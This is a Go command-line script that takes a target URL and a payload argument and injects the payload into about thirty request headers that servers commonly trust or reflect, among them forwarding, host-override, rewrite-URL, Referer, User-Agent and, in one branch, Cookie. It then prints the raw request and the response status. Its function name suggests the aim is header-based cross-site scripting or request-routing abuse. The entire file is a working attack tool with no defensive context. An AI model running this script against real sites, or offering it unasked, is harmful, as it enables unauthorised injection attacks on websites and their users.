package main

import (
    "fmt"
    "os"
//    "net/url"
    "net/http"
    "log"
    "net/http/httputil"
//    "io/ioutil"
//    "strings"
//    "time"
)


func xss(url1,server,cookie1 string) {


         client := &http.Client{}
         req, err := http.NewRequest("GET",url1, nil)
         req.Header.Add("Proxy-Host", server)
         req.Header.Add("Request-Uri", server)
         req.Header.Add("X-Forwarded", server)
         req.Header.Add("X-Forwarded-By", server)
         req.Header.Add("X-Forwarded-For", server)
         req.Header.Add("X-Forwarded-For-Original", server)
         req.Header.Add("X-Forwarded-Host", server)
         req.Header.Add("X-Forwarded-Server", server)
         req.Header.Add("X-Forwarder-For", server)
         req.Header.Add("X-Forward-For", server)
         req.Header.Add("Base-Url", server)
         req.Header.Add("Http-Url", server)
         req.Header.Add("Proxy-Url", server)
         req.Header.Add("Redirect", server)
         req.Header.Add("Real-Ip", server)
         req.Header.Add("Referer", server)
         req.Header.Add("Referrer", server)
         req.Header.Add("Refferer", server)
         req.Header.Add("Uri", server)
         req.Header.Add("Url", server)
         req.Header.Add("X-Host", server)
         req.Header.Add("X-Http-Destinationurl", server)
         req.Header.Add("X-Http-Host-Override", server)
         req.Header.Add("X-Original-Remote-Addr", server)
         req.Header.Add("X-Original-Url", server)
         req.Header.Add("X-Proxy-Url", server)
         req.Header.Add("X-Rewrite-Url", server)
         req.Header.Add("X-Real-Ip", server)
         req.Header.Add("X-Remote-Addr", server)
         req.Header.Add("User-Agent", server)
         req.Header.Add("Cookie", cookie1)
         req.Header.Add("Accept","text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8")
         req.Header.Add("Accept-Language","en-US,en;q=0.5")
         req.Header.Add("Accept-Encoding","gzip, deflate")


         res, err := client.Do(req)

         if err != nil{
            log.Fatal(err)
         }

         requestDump, err := httputil.DumpRequest(req, true)
         if err != nil {
              fmt.Println(err)
         }
         fmt.Println(string(requestDump),res.StatusCode)
         fmt.Println(res.StatusCode)
//         reqBody, err := ioutil.ReadAll(res.Body)
//         if err != nil {
//                          log.Fatal(err)
//         }
//         fmt.Printf("%s", reqBody)
}

func main() {
         url_test := os.Args[1]
         xss_test := os.Args[2]
         cookie:=os.Args[3]
         if cookie == "1" {
            xss(url_test,xss_test,os.Args[2])
         }else{
             xss(url_test,xss_test,os.Args[3])
         }



}
